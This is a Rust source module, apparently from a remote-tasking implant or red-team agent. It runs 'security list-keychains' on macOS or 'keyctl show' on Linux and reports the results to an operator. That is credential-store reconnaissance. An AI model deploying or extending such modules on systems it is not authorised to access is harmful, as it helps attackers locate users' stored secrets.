use crate::structs::Task;
use tokio::process::Command;

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    #[cfg(target_os = "macos")]
    {
        match Command::new("security").args(["list-keychains"]).output().await {
            Ok(output) => {
                response.user_output = String::from_utf8_lossy(&output.stdout).to_string();
                response.completed = true;
            }
            Err(e) => response.set_error(&format!("Failed: {}", e)),
        }
    }

    #[cfg(target_os = "linux")]
    {
        match Command::new("keyctl").args(["show"]).output().await {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                response.user_output = format!("{}{}", stdout, stderr);
                response.completed = true;
            }
            Err(e) => response.set_error(&format!("Failed: {}", e)),
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
